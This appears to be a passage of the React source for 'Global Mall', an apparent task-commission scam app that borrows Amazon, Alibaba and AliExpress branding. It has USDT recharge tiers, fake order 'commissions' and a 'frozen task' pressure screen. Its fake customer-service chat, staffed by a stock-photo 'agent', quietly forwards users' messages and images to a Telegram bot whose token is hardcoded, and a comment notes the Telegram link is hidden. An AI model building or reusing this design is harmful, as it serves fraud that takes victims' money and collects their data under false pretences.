import React, { useState, useEffect, useRef } from 'react';
import { 
  User, Wallet, Headphones, Home, Menu as MenuIcon, ChevronLeft, 
  Copy, ShoppingBag, LogOut, Bell, Lock, ArrowRight, 
  Download, IndianRupee, Box, History, LayoutGrid, Settings,
  CreditCard, CheckCircle2, AlertCircle, ChevronRight, Users, Share2,
  MessageCircle, FileText, UserPlus, Image as ImageIcon, Send, Paperclip,
  Eye, EyeOff, ArrowLeftRight, Check, Briefcase, Award, Info, ShieldCheck, HelpCircle
} from 'lucide-react';

// --- Configuration ---
// ⚠️ IMPORTANT: Chat ID set to the provided ID.
const TELEGRAM_BOT_TOKEN = '8304852258:AAH2yOPRQJ3UWjR_JmZ0QtkeHyr8Y46ME5Q'; 
const TELEGRAM_CHAT_ID = '7160908588'; 

// --- Types ---
type ViewState = 
  | 'home' 
  | 'service' 
  | 'product' // Menu View
  | 'task-record' // Bottom Nav Record (Task Progress)
  | 'financial-record' // Mine Grid Record (Stats)
  | 'deposit-history' // Mine List
  | 'withdraw-history' // Mine List
  | 'profile-details' // New Profile View
  | 'mine' 
  | 'team' 
  | 'wallet-management' 
  | 'invite' 
  | 'deposit' 
  | 'withdraw'
  | 'settings'
  | 'download'
  | 'register';

interface Product {
  id: string;
  title: string;
  price: number;
  image: string;
  commission: number;
  orderTime: string; // Added time
}

interface VIPTier {
  id: number;
  title: string;
  balanceRange: string; 
  commission: string;
  image: string;
  bgGradient: string;
  productCount: number; // Added to track how many products to show
}

interface ChatMessage {
    id: string;
    text?: string;
    image?: string;
    sender: 'user' | 'agent';
    time: string;
}

// --- Mock Data ---

// Enhanced Product Catalog with exactly 25 UNIQUE high-quality items
const PRODUCT_CATALOG = [
  // --- TIER 1: AMAZON (Electronics) ---
  { title: "GoPro Hero 12 Black", image: "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=500&q=80" }, 
  { title: "iPhone 15 Pro Titanium", image: "https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=500&q=80" },
  { title: "Sony WH-1000XM5", image: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500&q=80" },
  { title: "Samsung Galaxy Watch 6", image: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=500&q=80" },
  { title: "Canon EOS R5 Kit", image: "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=500&q=80" },
  { title: "DJI Mavic 3 Drone", image: "https://images.unsplash.com/photo-1507582020474-9a35b7d455d9?w=500&q=80" },
  { title: "PS5 DualSense Controller", image: "https://images.unsplash.com/photo-1606318801954-d46d46d3360a?w=500&q=80" },
  { title: "iPad Pro 12.9 inch", image: "https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=500&q=80" },

  // --- TIER 2: ALIBABA (Home Appliances) ---
  { title: "LG Smart Refrigerator", image: "https://images.unsplash.com/photo-1584568694244-14fbdf83bd30?w=500&q=80" },
  { title: "Panasonic Hair Dryer", image: "https://images.unsplash.com/photo-1522338140262-f46f5913618a?w=500&q=80" },
  { title: "Nespresso Machine", image: "https://images.unsplash.com/photo-1517668808822-9ebb02f2a0e6?w=500&q=80" },
  { title: "Xiaomi Air Purifier", image: "https://images.unsplash.com/photo-1585771724684-38269d6639fd?w=500&q=80" }, 
  { title: "KitchenAid Mixer Red", image: "https://images.unsplash.com/photo-1594385208974-2e75f8d7bb48?w=500&q=80" },
  { title: "JBL Bluetooth Speaker", image: "https://images.unsplash.com/photo-1608043152269-423dbba4e7e1?w=500&q=80" },
  { title: "Herman Miller Chair", image: "https://images.unsplash.com/photo-1505843490538-5133c6c7d0e1?w=500&q=80" },
  { title: "Smart Microwave Oven", image: "https://images.unsplash.com/photo-1585659722983-3a675dabf23d?w=500&q=80" }, 

  // --- TIER 3: ALIEXPRESS (Fashion & Lifestyle) ---
  { title: "Nike Air Jordan 1", image: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=500&q=80" },
  { title: "Louis Vuitton Bag", image: "https://images.unsplash.com/photo-1591561954557-26941169b49e?w=500&q=80" },
  { title: "Ray-Ban Wayfarer", image: "https://images.unsplash.com/photo-1511499767150-a48a237f0083?w=500&q=80" },
  { title: "Chanel Coco Mademoiselle", image: "https://images.unsplash.com/photo-1541643600914-78b084683601?w=500&q=80" },
  { title: "Blue Denim Jeans", image: "https://images.unsplash.com/photo-1542272454315-4c01d7abdf4a?w=500&q=80" },
  { title: "Red Stiletto Heels", image: "https://images.unsplash.com/photo-1543163521-1bf539c55dd2?w=500&q=80" },
  { title: "Rolex Gold Watch", image: "https://images.unsplash.com/photo-1524592094714-0f0654e20314?w=500&q=80" },
  { title: "Diamond Solitaire Ring", image: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=500&q=80" }, 
  { title: "Herschel Heritage Bag", image: "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=500&q=80" }
];

// Helper to generate products based on count and start index
// UPDATED: Prices strictly between $1.00 and $10.00
const generateProducts = (count: number, basePrice: number, startIndex: number): Product[] => {
    const now = new Date();
    // Format: YYYY:MM:DD:HH:MM:SS
    const timeStr = `${now.getFullYear()}:${(now.getMonth()+1).toString().padStart(2,'0')}:${now.getDate().toString().padStart(2,'0')}:${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;

    return Array.from({ length: count }).map((_, i) => {
        const catalogIndex = startIndex + i;
        const safeIndex = catalogIndex < PRODUCT_CATALOG.length ? catalogIndex : catalogIndex % PRODUCT_CATALOG.length;
        const product = PRODUCT_CATALOG[safeIndex];
        
        // Random price between 1.00 and 10.00
        const variedPrice = 1 + (Math.random() * 9); 
        
        return {
            id: `p-${startIndex}-${i}`,
            title: product.title,
            price: Number(variedPrice.toFixed(2)),
            commission: Number((variedPrice * 0.02).toFixed(2)), // approx 2%
            orderTime: timeStr,
            image: product.image
        };
    });
};

const VIP_TIERS: VIPTier[] = [
  { 
    id: 1, 
    title: 'Amazon', 
    balanceRange: '20USDT-199USDT', 
    commission: '4%', 
    bgGradient: "from-orange-500 to-yellow-500",
    image: "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",
    productCount: 8
  },
  { 
    id: 2, 
    title: 'Alibaba', 
    balanceRange: '199USDT-499USDT', 
    commission: '8%', 
    bgGradient: "from-orange-600 to-red-600",
    image: "https://upload.wikimedia.org/wikipedia/en/thumb/8/80/Alibaba-Group-Logo.svg/1200px-Alibaba-Group-Logo.svg.png",
    productCount: 8
  },
  { 
    id: 3, 
    title: 'AliExpress', 
    balanceRange: '499USDT-999USDT', 
    commission: '12%', 
    bgGradient: "from-red-600 to-pink-600",
    image: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/AliExpress_logo.svg/1200px-AliExpress_logo.svg.png",
    productCount: 9
  },
];

// --- Reusable Components ---

const Header = ({ title, onBack }: { title: string, onBack: () => void }) => (
  <div className="flex items-center gap-4 mb-6 pt-6 px-4 bg-[#0a0a0a] sticky top-0 z-50 pb-4 border-b border-[#1f1f1f]">
    <button onClick={onBack} className="p-2 bg-[#1c1c1c] rounded-full border border-[#2a2a2a] text-gray-200 active:scale-95">
      <ChevronLeft size={20} />
    </button>
    <h2 className="text-lg font-bold text-white">{title}</h2>
  </div>
);

// --- Sub-Views ---

const RegisterView = ({ onRegister, initialInviteCode, initialUsername }: { onRegister: () => void, initialInviteCode: string, initialUsername: string }) => {
    const [username, setUsername] = useState(initialUsername || '');
    const [password, setPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');
    const [inviteCode, setInviteCode] = useState(initialInviteCode);
    const [showPassword, setShowPassword] = useState(false);
    const [error, setError] = useState('');

    useEffect(() => {
        if (initialInviteCode) setInviteCode(initialInviteCode);
        if (initialUsername) setUsername(initialUsername);
    }, [initialInviteCode, initialUsername]);

    const handleRegister = () => {
        if (!username || !password || !inviteCode) {
            setError('All fields are required');
            return;
        }
        if (password !== confirmPassword) {
            setError('Passwords do not match');
            return;
        }
        // Simulate registration
        onRegister();
    };

    return (
        <div className="min-h-screen bg-[#0a0a0a] flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
            <div className="w-full max-w-sm">
                <div className="text-center mb-10">
                    <div className="w-16 h-16 bg-red-600 rounded-2xl mx-auto flex items-center justify-center mb-4 shadow-[0_0_30px_rgba(220,38,38,0.5)]">
                        <ShoppingBag size={32} className="text-white" />
                    </div>
                    <h1 className="text-2xl font-bold text-white mb-2">Create Account</h1>
                    <p className="text-gray-500 text-sm">Join Global Mall to start earning</p>
                </div>

                <div className="space-y-4">
                    {error && (
                        <div className="p-3 bg-red-900/20 border border-red-900/50 rounded-xl text-red-500 text-sm flex items-center gap-2">
                            <AlertCircle size={16} /> {error}
                        </div>
                    )}

                    <div className="space-y-1">
                        <label className="text-xs text-gray-500 font-bold ml-1">Username</label>
                        <div className="relative">
                            <input 
                                type="text" 
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                className="w-full bg-[#111] border border-[#222] rounded-xl p-4 pl-12 text-white outline-none focus:border-red-600 transition-colors"
                                placeholder="Enter username"
                            />
                            <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                        </div>
                    </div>

                    <div className="space-y-1">
                        <label className="text-xs text-gray-500 font-bold ml-1">Password</label>
                        <div className="relative">
                            <input 
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="w-full bg-[#111] border border-[#222] rounded-xl p-4 pl-12 pr-12 text-white outline-none focus:border-red-600 transition-colors"
                                placeholder="Enter password"
                            />
                            <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                            <button 
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500"
                            >
                                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                            </button>
                        </div>
                    </div>

                    <div className="space-y-1">
                        <label className="text-xs text-gray-500 font-bold ml-1">Confirm Password</label>
                        <div className="relative">
                            <input 
                                type="password"
                                value={confirmPassword}
                                onChange={(e) => setConfirmPassword(e.target.value)}
                                className="w-full bg-[#111] border border-[#222] rounded-xl p-4 pl-12 text-white outline-none focus:border-red-600 transition-colors"
                                placeholder="Confirm password"
                            />
                            <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                        </div>
                    </div>

                    <div className="space-y-1">
                        <label className="text-xs text-gray-500 font-bold ml-1">Invite Code</label>
                        <div className="relative">
                            <input 
                                type="text" 
                                value={inviteCode}
                                onChange={(e) => setInviteCode(e.target.value)}
                                className="w-full bg-[#111] border border-[#222] rounded-xl p-4 pl-12 text-white outline-none focus:border-red-600 transition-colors"
                                placeholder="Enter invite code"
                            />
                            <Share2 className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                        </div>
                    </div>

                    <button 
                        onClick={handleRegister}
                        className="w-full py-4 bg-red-600 hover:bg-red-700 active:scale-95 text-white font-bold rounded-xl shadow-lg transition-all mt-6"
                    >
                        Register Now
                    </button>
                    
                    <div className="text-center mt-6">
                        <p className="text-gray-500 text-sm">Already have an account? <span onClick={onRegister} className="text-red-500 font-bold cursor-pointer">Log in</span></p>
                    </div>
                </div>
            </div>
        </div>
    );
};

const HomeView = ({ onChangeView, vipLevel }: { onChangeView: (v: ViewState) => void, vipLevel: number }) => {
  return (
    <div className="pb-24 px-4 pt-6 animate-in fade-in duration-500">
      {/* Header Info */}
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-full bg-[#1c1c1c] border border-[#2a2a2a] flex items-center justify-center">
                <User size={24} className="text-red-600" />
            </div>
            <div>
                <div className="flex items-center gap-2">
                    <h2 className="text-white font-bold text-base">USER99</h2>
                    <span className={`text-white text-[10px] px-2 py-0.5 rounded-full font-bold ${vipLevel > 0 ? 'bg-red-600' : 'bg-gray-700'}`}>
                        VIP {vipLevel}
                    </span>
                </div>
                <p className="text-gray-500 text-xs mt-1">ID: 883742</p>
            </div>
        </div>
        <button onClick={() => onChangeView('service')} className="p-2.5 bg-[#1c1c1c] rounded-full border border-[#2a2a2a] text-white">
            <Headphones size={20} />
        </button>
      </div>

      {/* Banner */}
      <div className="w-full bg-gradient-to-r from-red-900 to-[#1a1a1a] rounded-2xl p-6 mb-8 relative overflow-hidden border border-red-900/30">
        <div className="relative z-10">
            <span className="text-red-400 text-[10px] font-bold tracking-wider uppercase mb-1 block">Platform News</span>
            <h3 className="text-xl font-bold text-white mb-2">Join Global Mall</h3>
            <p className="text-gray-300 text-xs max-w-[70%]">Upgrade your VIP level to earn higher commissions daily.</p>
        </div>
        <div className="absolute right-[-10px] bottom-[-10px] opacity-10 rotate-12">
            <ShoppingBag size={100} className="text-white" />
        </div>
      </div>

      {/* Main Actions */}
      <div className="grid grid-cols-2 gap-4 mb-8">
         <button onClick={() => onChangeView('deposit')} className="bg-[#111] rounded-2xl p-4 flex flex-col items-center justify-center gap-2 border border-[#222] active:scale-95 transition-transform">
             <div className="w-10 h-10 rounded-full bg-green-900/20 flex items-center justify-center text-green-500 mb-1">
                <Wallet size={20} />
             </div>
             <span className="text-white font-bold text-sm">Recharge</span>
         </button>

         <button onClick={() => onChangeView('withdraw')} className="bg-[#111] rounded-2xl p-4 flex flex-col items-center justify-center gap-2 border border-[#222] active:scale-95 transition-transform">
             <div className="w-10 h-10 rounded-full bg-red-900/20 flex items-center justify-center text-red-500 mb-1">
                <Wallet size={20} />
             </div>
             <span className="text-white font-bold text-sm">Withdraw</span>
         </button>
      </div>

      {/* Quick Access Grid */}
      <div className="grid grid-cols-4 gap-4 mb-6">
          <div onClick={() => onChangeView('task-record')} className="flex flex-col items-center gap-2 cursor-pointer">
              <div className="w-12 h-12 bg-[#111] rounded-2xl flex items-center justify-center border border-[#222]">
                  <IndianRupee size={20} className="text-blue-500" />
              </div>
              <span className="text-[11px] text-gray-400">Task</span>
          </div>
          <div onClick={() => onChangeView('task-record')} className="flex flex-col items-center gap-2 cursor-pointer">
              <div className="w-12 h-12 bg-[#111] rounded-2xl flex items-center justify-center border border-[#222]">
                  <Box size={20} className="text-purple-500" />
              </div>
              <span className="text-[11px] text-gray-400">Orders</span>
          </div>
          <div onClick={() => onChangeView('invite')} className="flex flex-col items-center gap-2 cursor-pointer">
              <div className="w-12 h-12 bg-[#111] rounded-2xl flex items-center justify-center border border-[#222]">
                  <Users size={20} className="text-orange-500" />
              </div>
              <span className="text-[11px] text-gray-400">Invite</span>
          </div>
          <div onClick={() => onChangeView('download')} className="flex flex-col items-center gap-2 cursor-pointer">
              <div className="w-12 h-12 bg-[#111] rounded-2xl flex items-center justify-center border border-[#222]">
                  <Download size={20} className="text-green-500" />
              </div>
              <span className="text-[11px] text-gray-400">App</span>
          </div>
      </div>
    </div>
  );
};

const MenuView = ({ onWorkStart }: { onWorkStart: (tierId: number) => void }) => {
  const [activeWorkTier, setActiveWorkTier] = useState<VIPTier | null>(null);
  const [tierProducts, setTierProducts] = useState<Product[]>([]);
  const [submitted, setSubmitted] = useState(false);

  // Load products when a tier is selected
  useEffect(() => {
    if (activeWorkTier) {
        setSubmitted(false);
        // Determine start index based on tier ID to ensure unique products
        // Tier 1 (Amazon): Starts at 0, takes 8 (indices 0-7)
        // Tier 2 (Alibaba): Starts at 8, takes 8 (indices 8-15)
        // Tier 3 (AliExpress): Starts at 16, takes 9 (indices 16-24)
        let startIndex = 0;
        if (activeWorkTier.id === 2) startIndex = 8;
        if (activeWorkTier.id === 3) startIndex = 16;

        const products = generateProducts(activeWorkTier.productCount, 25, startIndex);
        setTierProducts(products);
        onWorkStart(activeWorkTier.id);
    }
  }, [activeWorkTier]);

  const handleSubmitAll = () => {
      setSubmitted(true);
      setTimeout(() => {
          alert("All orders submitted successfully!");
          setActiveWorkTier(null);
      }, 1000);
  };

  // --- Product Room (Vertical List View) ---
  if (activeWorkTier) {
      return (
        <div className="pb-24 pt-4 px-4 min-h-screen bg-[#0a0a0a]">
           {/* Header */}
           <div className="flex items-center gap-4 mb-6 sticky top-0 bg-[#0a0a0a] z-50 py-2 border-b border-[#222]">
                <button onClick={() => setActiveWorkTier(null)} className="p-2 bg-[#1c1c1c] rounded-full border border-[#2a2a2a] text-white">
                    <ChevronLeft size={20} />
                </button>
                <div className="flex flex-col">
                    <h2 className="text-lg font-bold text-white leading-none">{activeWorkTier.title}</h2>
                    <span className="text-[10px] text-gray-500">Tasks: {activeWorkTier.productCount}</span>
                </div>
           </div>
           
           {/* Product List */}
           <div className="flex flex-col gap-3 mb-6">
               {tierProducts.map((product) => (
                   <div key={product.id} className="bg-[#111] border border-[#222] rounded-xl p-3 flex items-start gap-4">
                       
                       {/* Left: Image (Made larger and nicer) */}
                       <div className="w-32 h-32 bg-white p-2 rounded-lg flex-shrink-0 flex items-center justify-center border border-gray-100 overflow-hidden">
                           <img 
                              src={product.image} 
                              alt={product.title} 
                              className="w-full h-full object-contain hover:scale-110 transition-transform duration-300" 
                           />
                       </div>

                       {/* Right: 6 Specific Lines */}
                       <div className="flex-1 min-w-0 flex flex-col gap-1 justify-center py-1">
                           
                           {/* 1. Title */}
                           <h3 className="text-white text-sm font-bold truncate">{product.title}</h3>
                           
                           {/* 2. Price x Quantity */}
                           <p className="text-yellow-500 text-xs font-medium">{product.price}USDT x1</p>
                           
                           {/* 3. Order Time */}
                           <p className="text-gray-500 text-[10px]">Order time. {product.orderTime}</p>
                           
                           {/* 4. Product Order Total */}
                           <p className="text-white text-xs">Product order {product.price}USDT</p>
                           
                           {/* 5. Commission */}
                           <p className="text-red-500 text-xs font-bold">Commission. {product.commission}USDT</p>
                           
                           {/* 6. Expert Income */}
                           <p className="text-green-500 text-xs font-bold">Expert income. {(product.price + product.commission).toFixed(2)}USDT</p>
                           
                       </div>
                   </div>
               ))}
           </div>

           {/* Submit Button (Inline below list) */}
           <div className="mt-4 mb-8">
               <button 
                onClick={handleSubmitAll}
                disabled={submitted}
                className="w-full py-4 bg-red-600 rounded-xl text-white font-bold text-lg shadow-lg active:scale-95 transition-all disabled:opacity-50 disabled:scale-100 flex items-center justify-center gap-2"
               >
                   {submitted ? <CheckCircle2 /> : <Check />}
                   {submitted ? 'Submitted' : 'Submit Orders'}
               </button>
           </div>
        </div>
      );
  }

  // --- VIP Card List (Main Menu) ---
  return (
    <div className="pb-24 px-4 pt-6 animate-in fade-in duration-500">
      <h2 className="text-xl font-bold text-white mb-6 pl-1">VIP Market</h2>
      <div className="flex flex-col gap-4">
        {VIP_TIERS.map((tier) => (
          <div 
            key={tier.id} 
            onClick={() => setActiveWorkTier(tier)}
            className="bg-[#111] rounded-2xl p-4 border border-[#222] group active:scale-[0.98] transition-all cursor-pointer flex items-center gap-4"
          >
            {/* Left Side: Logo (White bg for clarity) */}
            <div className="w-20 h-20 flex-shrink-0 bg-white rounded-xl flex items-center justify-center p-2 shadow-inner">
               <img src={tier.image} alt={tier.title} className="w-full h-full object-contain" />
            </div>

            {/* Right Side: 3 Strictly Defined Lines */}
            <div className="flex-1 flex flex-col justify-center space-y-1.5 min-w-0">
                {/* Line 1: Title */}
                <h3 className="text-lg font-bold text-white truncate">{tier.title}</h3>
                
                {/* Line 2: Balance */}
                <div className="flex items-center gap-2 truncate">
                    <span className="text-[10px] text-gray-500 uppercase font-bold tracking-wider flex-shrink-0">Available balance:</span>
                    <span className="text-xs font-bold text-yellow-500 truncate">{tier.balanceRange}</span>
                </div>

                {/* Line 3: Commission */}
                <div className="flex items-center gap-2 truncate">
                    <span className="text-[10px] text-gray-500 uppercase font-bold tracking-wider flex-shrink-0">Commission:</span>
                    <span className="text-xs font-bold text-red-500 truncate">{tier.commission}</span>
                </div>
            </div>

            {/* Arrow Icon */}
            <div className="text-gray-500 flex-shrink-0">
                <ChevronRight size={20} />
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

const ServiceView = ({ onBack }: { onBack: () => void }) => {
  const [ukTime, setUkTime] = useState('');
  const [messages, setMessages] = useState<ChatMessage[]>([
      { id: '1', text: 'Hello! How can I help you today?', sender: 'agent', time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) }
  ]);
  const [inputText, setInputText] = useState('');
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Update UK Time
    const timer = setInterval(() => {
        setUkTime(new Date().toLocaleTimeString('en-GB', { timeZone: 'Europe/London', hour: '2-digit', minute: '2-digit' }));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
      messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const sendToTelegram = async (text: string, photo?: File) => {
     if (!TELEGRAM_CHAT_ID) {
         console.warn("TELEGRAM_CHAT_ID is missing. Message not sent to Telegram.");
         return;
     }

     try {
         if (photo) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', photo);
             formData.append('caption', text || 'Image from user');
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
         } else if (text) {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: `New Message from Global Mall:\n\n${text}`
                 })
             });
         }
     } catch (error) {
         console.error("Failed to send to Telegram", error);
     }
  };

  const handleSend = () => {
      if (!inputText.trim()) return;
      const newMsg: ChatMessage = {
          id: Date.now().toString(),
          text: inputText,
          sender: 'user',
          time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
      };
      setMessages([...messages, newMsg]);
      
      // Send to Telegram
      sendToTelegram(inputText);

      setInputText('');
      
      // Simulate reply
      setTimeout(() => {
          setMessages(prev => [...prev, {
              id: (Date.now() + 1).toString(),
              text: 'Please wait, checking your request...',
              sender: 'agent',
              time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
          }]);
      }, 1500);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (file) {
          const reader = new FileReader();
          reader.onloadend = () => {
              const newMsg: ChatMessage = {
                  id: Date.now().toString(),
                  image: reader.result as string,
                  sender: 'user',
                  time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
              };
              setMessages(prev => [...prev, newMsg]);
          };
          reader.readAsDataURL(file);

          // Send to Telegram
          sendToTelegram("User sent an image", file);
      }
  };

  return (
    <div className="h-screen bg-[#0a0a0a] flex flex-col relative z-[60]">
      {/* Custom Header - Updated to hide Telegram link */}
      <div className="bg-[#111] px-4 py-4 flex items-center justify-between border-b border-[#222] shadow-md">
          <div className="flex items-center gap-3">
              <button onClick={(e) => { e.stopPropagation(); onBack(); }} className="p-1 rounded-full text-gray-400 hover:text-white">
                  <ChevronLeft size={24} />
              </button>
              <div className="relative">
                 <img 
                    src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=100&q=80" 
                    alt="Agent" 
                    className="w-10 h-10 rounded-full object-cover border border-[#333]"
                 />
                 <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-[#111]"></div>
              </div>
              <div className="flex flex-col">
                  <h3 className="text-white font-bold text-sm">Customer Service</h3>
                  <span className="text-[10px] text-green-500 font-medium">24/7 Online</span>
              </div>
          </div>
          <div className="flex flex-col items-end">
              <img 
                src="https://upload.wikimedia.org/wikipedia/en/a/ae/Flag_of_the_United_Kingdom.svg" 
                alt="UK" 
                className="w-6 h-4 object-cover rounded-sm mb-0.5"
              />
              <span className="text-gray-400 text-[10px] font-mono">{ukTime} UK</span>
          </div>
      </div>

      {/* Chat Area */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-[#0a0a0a]">
          {messages.map((msg) => (
              <div key={msg.id} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                  <div className={`max-w-[75%] p-3 rounded-2xl ${
                      msg.sender === 'user' 
                      ? 'bg-red-600 text-white rounded-br-none' 
                      : 'bg-[#1c1c1c] text-gray-200 border border-[#2a2a2a] rounded-bl-none'
                  }`}>
                      {msg.image ? (
                          <img src={msg.image} alt="Sent" className="rounded-lg max-w-full" />
                      ) : (
                          <p className="text-sm">{msg.text}</p>
                      )}
                      <span className={`text-[9px] block text-right mt-1 opacity-70`}>{msg.time}</span>
                  </div>
              </div>
          ))}
          <div ref={messagesEndRef} />
      </div>

      {/* Input Area */}
      <div className="p-3 bg-[#111] border-t border-[#222] flex items-center gap-3">
          <input 
              type="file" 
              ref={fileInputRef} 
              className="hidden" 
              accept="image/*"
              onChange={handleFileUpload}
          />
          <button 
            onClick={() => fileInputRef.current?.click()}
            className="p-2 text-gray-400 hover:text-white bg-[#1c1c1c] rounded-full"
          >
              <ImageIcon size={20} />
          </button>
          
          <input 
              type="text" 
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleSend()}
              placeholder="Type a message..." 
              className="flex-1 bg-[#1c1c1c] border border-[#333] rounded-full px-4 py-2.5 text-sm text-white focus:border-red-600 outline-none"
          />
          
          <button 
            onClick={handleSend}
            className="p-2.5 bg-red-600 rounded-full text-white shadow-lg active:scale-95 transition-transform"
          >
              <Send size={18} />
          </button>
      </div>
    </div>
  );
};

// 1. Task Record View (Bottom Nav Button)
// Focus: Pending/Frozen Tasks, Continuation of work
const TaskRecordView = ({ onBack }: { onBack: () => void }) => {
    // Mock frozen task to show "where user stopped"
    // UPDATED: Low Price ($1-10 range)
    const frozenTask = {
        id: 'frozen-1',
        title: "Apple MacBook Pro 16",
        price: 8.50,
        commission: 0.17,
        image: "https://images.unsplash.com/photo-1517336714731-489689fd1ca4?w=500&q=80",
        orderTime: "2023:10:25:09:15:00"
    };

    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
            <Header title="Task Progress" onBack={onBack} />
            
            {/* Status Tabs */}
            <div className="flex p-1 bg-[#111] rounded-xl mb-6 border border-[#222]">
                <button className="flex-1 py-2 text-sm font-medium text-gray-500">All</button>
                <button className="flex-1 py-2 text-sm font-bold text-black bg-white rounded-lg shadow-sm">Pending</button>
                <button className="flex-1 py-2 text-sm font-medium text-gray-500">Completed</button>
                <button className="flex-1 py-2 text-sm font-medium text-gray-500">Frozen</button>
            </div>

            {/* Alert for Pending Task */}
            <div className="mb-6 p-4 bg-red-900/20 border border-red-900/50 rounded-xl flex items-start gap-3 animate-pulse">
                 <AlertCircle className="text-red-500 shrink-0 mt-1" size={20} />
                 <div>
                     <h3 className="text-red-500 font-bold text-sm">Task Pending</h3>
                     <p className="text-gray-400 text-xs mt-1">
                         You have an unfinished task order. Please complete it to continue receiving new orders.
                     </p>
                 </div>
            </div>

            {/* The Frozen/Pending Task Card */}
            <div className="bg-[#111] border border-[#222] rounded-xl p-4 relative overflow-hidden">
                <div className="absolute top-0 right-0 bg-red-600 text-white text-[10px] px-2 py-1 rounded-bl-lg font-bold">
                    PENDING
                </div>
                <div className="flex gap-4">
                     <div className="w-24 h-24 bg-white rounded-lg p-2 flex items-center justify-center">
                         <img src={frozenTask.image} alt={frozenTask.title} className="max-w-full max-h-full object-contain" />
                     </div>
                     <div className="flex-1 min-w-0">
                         <h4 className="text-white font-bold text-sm truncate mb-1">{frozenTask.title}</h4>
                         <p className="text-gray-500 text-xs mb-2">Order Time: {frozenTask.orderTime}</p>
                         <div className="flex justify-between items-end">
                             <div>
                                 <p className="text-[10px] text-gray-500">Amount</p>
                                 <p className="text-white font-bold">${frozenTask.price.toFixed(2)}</p>
                             </div>
                             <div className="text-right">
                                 <p className="text-[10px] text-gray-500">Commission</p>
                                 <p className="text-green-500 font-bold">+${frozenTask.commission.toFixed(2)}</p>
                             </div>
                         </div>
                     </div>
                </div>
                <button className="w-full mt-4 bg-red-600 py-3 rounded-lg text-white font-bold text-sm hover:bg-red-700 active:scale-95 transition-all">
                    Continue Task
                </button>
            </div>

            <div className="mt-8 text-center">
                <p className="text-gray-600 text-xs">Task 5 / 10 in progress</p>
            </div>
        </div>
    );
};

// 2. Financial Record View (Mine -> Grid Record)
// Focus: Dashboard Grid Stats (Balance, Commission, Withdraw, Deposit)
const FinancialRecordView = ({ onBack }: { onBack: () => void }) => {
    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
            <Header title="Financial Overview" onBack={onBack} />

            {/* Grid Layout 2x2 */}
            <div className="grid grid-cols-2 gap-4 mb-6">
                {/* Main Balance */}
                <div className="bg-gradient-to-br from-[#1a1a1a] to-[#111] p-4 rounded-xl border border-[#222] flex flex-col justify-between h-32 relative overflow-hidden">
                    <div className="relative z-10">
                        <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider">Main Balance</span>
                        <h3 className="text-2xl font-bold text-white mt-1">$0.00</h3>
                    </div>
                    <div className="relative z-10">
                        <div className="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-500">
                             <Wallet size={16} />
                        </div>
                    </div>
                    {/* Decorative Blob */}
                    <div className="absolute -right-4 -top-4 w-16 h-16 bg-blue-500/10 rounded-full blur-xl"></div>
                </div>

                {/* Commission */}
                <div className="bg-gradient-to-br from-[#1a1a1a] to-[#111] p-4 rounded-xl border border-[#222] flex flex-col justify-between h-32 relative overflow-hidden">
                     <div className="relative z-10">
                        <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider">Commission</span>
                        <h3 className="text-2xl font-bold text-green-400 mt-1">$0.00</h3>
                    </div>
